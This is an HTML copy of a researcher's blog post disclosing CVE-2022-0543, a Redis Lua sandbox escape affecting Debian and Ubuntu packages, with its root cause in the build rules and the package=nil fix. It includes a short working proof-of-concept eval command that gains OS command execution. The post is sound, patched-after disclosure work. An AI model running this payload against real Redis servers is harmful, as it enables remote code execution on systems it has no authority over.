<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce">Original</a>
    <h1>CVE-2022-0543: An unexpected Redis sandbox escape affecting Debian-based distros</h1>
    
    <div id="readability-page-1" class="page">
    
    <p>This post describes how I broke the Redis sandbox, but only for
      Debian and Debian-derived Linux distributions. Upstream Redis is
      not affected. That makes it a Debian vulnerability, not a Redis
      one. The culprit, if you will, is dynamic linking, but there
      will be more on that later.

    </p><p>This received the CVE id of <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0543">CVE-2022-0543</a>. Debian also
      released
      the <a href="https://www.debian.org/security/2022/dsa-5081">DSA-5081
	security advisory</a> on 18/Feb/2022, and Ubuntu
      released <a href="https://ubuntu.com/security/notices/USN-5316-1">USN-5316-1</a>
      on 7/Mar/2022, so I&#39;m releasing this post on 8/Mar/2022.</p>
    <h2>Redis in 30 seconds</h2>
    <p><a href="https://redis.io/">Redis</a> is a very widely used
      service for caching, but it&#39;s also used as a message
      broker. Clients talk to a Redis server over a socket, send
      commands, and the server changes its state (i.e. its in-memory
      structures), in response to such commands. Redis embeds the Lua
      programming language as its scripting engine, which is made
      available through the <b>eval</b> command. The Lua engine
      is <a href="http://antirez.com/news/119">expected to be
	sandboxed</a>, i.e., clients can interact with the Redis APIs
      from Lua, but should not be able to execute arbitrary code on
      the machine where Redis is running.</p>
    <h2>Background</h2>
    <p>Back in January, I was doing research on Redis, not because of
      Redis per se, but because I have a hunch that cloud providers of
      standalone Redis (and other DB) services might be doing
      &#34;interesting&#34; things that might lead to cross-account
      vulnerabilities. Some earlier examples of the kind of attack I&#39;m
      talking about include:</p>
    <ul>
      <li>Ezequiel
	Pereira&#39;s <a href="https://www.ezequiel.tech/2020/08/dropping-shell-in.html">attack
	  on Google Cloud SQL</a>, back in 2020</li>
      <li>Wiz&#39;s <a href="https://www.wiz.io/blog/chaosdb-explained-azures-cosmos-db-vulnerability-walkthrough/">ChaosDB
	  vulnerability on Azure&#39;s Cosmos DB</a>, in 2021</li>
      <li>Orca
	Security&#39;s <a href="https://orca.security/resources/blog/autowarp-microsoft-azure-automation-service-vulnerability/">AutoWarp
	  Azure Automation Environment vulnerability</a>, in March of
	2022.</li>
    </ul>

    <p>The general path to such an attack would be:</p>
    <ol>
      <li>Find an RCE vulnerability on a cloud service</li>
      <li>Escape the container, if any</li>
      <li>Talk directly to the orchestrator and/or some kind of metadata
	service, which will assume you are trusted, because it assumes
	only trusted services can talk to it in the first place</li>
    </ol>

    <p>Of those, the hardest part is the first, in my experience. Usually,
      the container can be escaped trivially. The fact that the
      orchestrator/metadata service accepts commands is of course a
      vulnerability, but a fairly prevalent one. The word is out that it&#39;s
      possible to talk to orchestrators/metadata services from less
      privileged contexts, so maybe that will get fixed over time. But for
      now, cool bounties can be made by researchers doing what I was
      trying to do here.</p>

    <h2>The PoC</h2>
    <p>On a x86-64 machine, one can do:</p>
    <code>eval &#39;local os_l =
      package.loadlib(&#34;/usr/lib/x86_64-linux-gnu/liblua5.1.so&#34;,
      &#34;luaopen_os&#34;); local os = os_l(); os.execute(&#34;touch /tmp/redis_poc&#34;);
      return 0&#39;</code>
    <p>For other architectures, the path to loadlib must be adjusted.</p>

    <h2>Why, though?</h2>
    <p>At first, I thought I had found a general vulnerability, but I
      quickly noticed that trying the PoC on different distros or on
      code I built myself didn&#39;t work. Upstream Redis statically links
      Lua so, since the luaopen_package and luaopen_os functions are
      not used by Redis, those functions aren&#39;t even present in the
      binary. Redis upstream also includes and initializes the
      lua-bitop and lua-cjson libraries, which are not part of
      standard Lua. The initialization of upstream Redis looks like this:</p>

    <pre>void luaLoadLibraries(lua_State *lua) {                                                                                                                                                   
    luaLoadLib(lua, &#34;&#34;, luaopen_base);                                                                                                                                                    
    luaLoadLib(lua, LUA_TABLIBNAME, luaopen_table);                                                                                                                                       
    luaLoadLib(lua, LUA_STRLIBNAME, luaopen_string);                                                                                                                                      
    luaLoadLib(lua, LUA_MATHLIBNAME, luaopen_math);                                                                                                                                       
    luaLoadLib(lua, LUA_DBLIBNAME, luaopen_debug);                                                                                                                                        
    luaLoadLib(lua, &#34;cjson&#34;, luaopen_cjson);                                                                                                                                              
    luaLoadLib(lua, &#34;struct&#34;, luaopen_struct);                                                                                                                                            
    luaLoadLib(lua, &#34;cmsgpack&#34;, luaopen_cmsgpack);                                                                                                                                        
    luaLoadLib(lua, &#34;bit&#34;, luaopen_bit);                                                                                                                                                  
                                                                                                                                                                                          
#if 0 /* Stuff that we don&#39;t load currently, for sandboxing concerns. */
    luaLoadLib(lua, LUA_LOADLIBNAME, luaopen_package);                                                                                                                                    
    luaLoadLib(lua, LUA_OSLIBNAME, luaopen_os);                                                                                                                                           
#endif 
</pre>
    <p>On Debian, Lua is loaded dynamically by Redis and, moreover,
      lua-bitop and lua-cjson are their own packages, which are loaded
      when the Lua interpreter itself is initialized. When the
      interpreter initialization was performed, the <b>module</b>
      and <b>require</b> Lua variables, which are present in the
      global environment on upstream Lua, but not on Redis&#39; Lua, and
      would also enable this same attack, were cleared out, but
      the <b>package</b> variable was not. This was done via the
      debian/rules file, which generates a debian/lua_libs_debian.c
      files, which is included right after the <em>#endif</em>
      directive shown above. Here are the relevant excerpts:</p>
    <pre># Try and use these Lua modules shipped in Debian...
LUA_LIBS_DEBIAN = cjson bitop

# ... which are not always called their &#34;C&#34; names
LUA_LIBS_DEBIAN_NAMES = cjson bit

# ...

debian/lua_libs_debian.c:
        echo &#34;// Automatically generated; do not edit.&#34; &gt;$@
        echo &#34;luaLoadLib(lua, LUA_LOADLIBNAME, luaopen_package);&#34; &gt;&gt;$@
        set -e; for X in $(LUA_LIBS_DEBIAN_NAMES); do \
                echo &#34;if (luaL_dostring(lua, \&#34;$$X = require(&#39;$$X&#39;);\&#34;))&#34; &gt;&gt;$@; \
                echo &#34;    serverLog(LL_NOTICE, \&#34;Error loading $$X library\&#34;);&#34; &gt;&gt;$@; \
        done
        echo &#39;luaL_dostring(lua, &#34;module = nil; require = nil;&#34;);&#39; &gt;&gt;$@
</pre>

    <p>Note that luaopen_package ends up being called, contrary to
      what happens in upstream. That has the side effect of binding
      three variables in the global
      environment: <b>module</b>, <b>require</b>,
      and <b>package</b>. The first two are cleared out in the
      vulnerable version, but the latter wasn&#39;t. So, the fix was,
      you guessed it, to add <b>package=nil</b> to the end of the Lua
      initialization.</p>

    <h2>Who should care?</h2>
    <p>Only people who run Redis on Debian, Ubuntu, and possibly other
    Debian-based distros. Just make sure your system is up to
    date.</p>
    <p>Interestingly, I was surprised that I had to report this to
    Debian and Ubuntu separately. I expected that Ubuntu would either
    automatically pick the fix up or that there would be a manual
    process wherein someone at Canonical would take a look at all
    Debian security announcements and check whether they apply to
    Ubuntu as well. I&#39;ll leave that as a suggestion to Canonical.</p>
  

</div>
  </body>
</html>
